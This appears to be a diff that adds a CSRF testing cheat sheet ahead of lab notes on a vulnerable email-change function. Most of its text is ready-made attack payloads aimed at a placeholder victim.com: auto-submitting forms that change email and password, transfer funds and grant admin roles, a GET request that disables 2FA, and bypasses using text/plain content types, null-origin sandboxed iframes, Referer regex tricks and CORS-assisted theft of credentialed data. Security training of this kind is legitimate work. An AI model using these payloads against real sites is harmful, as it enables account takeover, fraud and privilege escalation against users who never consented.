@@ -1,3 +1,263 @@
+# ✅ **Cross-Site Request Forgery (CSRF) – Complete Test Case (with Bypass Cases)**
+---
+# **1. List of Vulnerabilities (CSRF Attack Surface)**
+
+* **1.1 Missing CSRF Token Validation**
+  No anti-CSRF token → attacker forces authenticated actions.
+
+* **1.2 Predictable / Reusable CSRF Tokens**
+  Token not random, or same token reused across sessions.
+
+* **1.3 No SameSite Cookie Protection**
+  Cookies automatically sent with cross-site requests.
+
+* **1.4 Token Not Bound to Session/User**
+  Token reused by another user.
+
+* **1.5 Token Not Bound to HTTP Method**
+  Token works even when method changes from POST → GET.
+
+* **1.6 No Origin/Referer Validation**
+  Server does not validate request origin.
+
+* **1.7 CSRF with JSON Endpoints**
+  API accepts requests from <script> or forms.
+
+* **1.8 CORS Misconfig + CSRF Combo**
+  Exploits both → severe account takeover.
+
+* **1.9 Multi-Step CSRF**
+  Multi-page transaction forced automatically.
+
+* **1.10 Clickjacking + CSRF Hybrid Attack**
+  User tricked into clicking invisible CSRF-trigger action.
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+(Safe training examples — no harmful execution)
+
+### **2.1 HTML Auto-Submit Form (Classic CSRF PoC)**
+
+```html
+<html>
+<body onload="document.forms[0].submit()">
+<form action="https://victim.com/user/update-email" method="POST">
+    <input type="hidden" name="email" value="attacker@mail.com">
+</form>
+</body>
+</html>
+```
+
+### **2.2 Image Tag (GET-Based CSRF)**
+
+```html
+<img src="https://victim.com/settings/disable-2fa">
+```
+
+### **2.3 CSRF for Money Transfer**
+
+```html
+<form action="https://victim.com/transfer" method="POST">
+  <input type="hidden" name="amount" value="5000">
+  <input type="hidden" name="to" value="attacker">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+### **2.4 JSON CSRF via POST (simple PoC)**
+
+```html
+<form action="https://victim.com/api/profile" method="POST"
+      enctype="text/plain">
+{"email":"attacker@mail.com"}
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+---
+
+# **3. Bypass Payloads (Advanced Techniques)**
+
+### **3.1 CSRF Token Stripping via Content-Type**
+
+Server accepts:
+
+```
+Content-Type: text/plain
+```
+
+Bypass token requirement:
+
+```html
+<form action="https://victim.com/api/change" enctype="text/plain" method="POST">
+{"role":"admin"}
+</form>
+```
+
+### **3.2 SameSite Cookie Bypass**
+
+If server sets:
+
+```
+Set-Cookie: session=abc; SameSite=None; Secure
+```
+
+Cookies still sent cross-site → CSRF possible.
+
+### **3.3 JSON CSRF Bypass with Misconfigured Parsers**
+
+```html
+<form action="https://victim.com/api/update" enctype="application/json" method="POST">
+{"admin":true}
+</form>
+```
+
+### **3.4 CORS-Assisted CSRF**
+
+If server returns:
+
+```
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Origin: https://attacker.com
+```
+
+Attacker steals API data:
+
+```js
+fetch("https://victim.com/account", {credentials:"include"})
+```
+
+### **3.5 Flash CSRF (Legacy Bypass)**
+
+If client-side protects only HTML forms:
+
+```html
+<object data="csrf.swf"></object>
+```
+
+### **3.6 Null-Origin Bypass**
+
+`Origin: null` via sandboxed iframe:
+
+```html
+<iframe sandbox="allow-scripts" srcdoc="
+    <form action='https://victim.com/delete' method='POST'></form>
+    <script>document.forms[0].submit()</script>
+"></iframe>
+```
+
+### **3.7 Referer Leak Bypass**
+
+If server checks only Referer domain:
+
+```
+https://victim.com.evil.net/update
+```
+
+→ bypasses regex.
+
+### **3.8 Preflight Bypass via GET → POST Confusion**
+
+If API incorrectly allows:
+
+```
+GET /delete-account
+```
+
+---
+
+# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
+
+### **4.1 Change Password CSRF**
+
+```html
+<form action="https://victim.com/password/change" method="POST">
+  <input type="hidden" name="newPassword" value="Attacker123">
+</form>
+```
+
+### **4.2 Disable 2FA**
+
+```html
+<img src="https://victim.com/user/2fa/disable">
+```
+
+### **4.3 Admin Privilege Escalation**
+
+```html
+<form action="https://victim.com/admin/update-role" method="POST">
+  <input type="hidden" name="role" value="admin">
+  <input type="hidden" name="user" value="attacker">
+</form>
+```
+
+### **4.4 OAuth/SSO CSRF (Force Login)**
+
+```html
+<img src="https://victim.com/oauth/authorize?client_id=attacker&response_type=token">
+```
+
+### **4.5 CSRF with Multi-Step Transaction**
+
+```html
+<iframe src="https://victim.com/step1?amount=5000"></iframe>
+<iframe src="https://victim.com/step2"></iframe>
+<iframe src="https://victim.com/confirm"></iframe>
+```
+
+### **4.6 REST API CSRF**
+
+```html
+<form action="https://victim.com/api/user" enctype="application/x-www-form-urlencoded">
+  username=hacked&role=admin
+</form>
+```
+
+---
+
+# **5. Validation / Test Steps**
+
+**Step 1:** Identify state-changing endpoints
+→ profile updates, finance actions, admin functions.
+
+**Step 2:** Check if tokens exist
+
+* hidden inputs
+* headers
+* double submit cookies
+
+**Step 3:** Verify token tied to session/user
+→ must be unique per session.
+
+**Step 4:** Try basic CSRF PoC
+→ auto-submitting form.
+
+**Step 5:** Try JSON endpoints
+→ test `text/plain`, `application/json`, etc.
+
+**Step 6:** Test Origin and Referer validation
+→ send custom header values.
+
+**Step 7:** Try advanced bypasses
+→ Null-Origin, SameSite=None, CORS combo.
+
+---
+
+# **6. Expected Results / Impact**
+
+* Profile modifications.
+* Email/Password change → account takeover.
+* Funds transfer without consent.
+* Admin privilege escalation.
+* OAuth token hijack or unauthorized login.
+* Disabling MFA / security settings.
+
+CSRF can lead to **complete account takeover** and financial loss.
+
+---
+
 # 01 CSRF vulnerability with no defenses
 
 This lab's email change functionality is vulnerable to CSRF.
